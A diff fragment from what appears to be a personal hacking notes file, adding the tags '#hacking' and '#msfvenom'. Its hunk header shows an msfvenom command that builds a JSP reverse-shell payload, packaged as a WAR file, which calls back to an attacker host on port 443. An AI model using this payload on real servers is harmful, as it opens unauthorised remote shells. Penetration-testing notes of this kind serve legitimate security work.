@@ -8,4 +8,4 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=443 -f war -o shell.wa
 - ~/kb/hacking/commands/msfvenom-commands.md
 
 Tags:
-    #assorted #command
+    #assorted #command #hacking #msfvenom
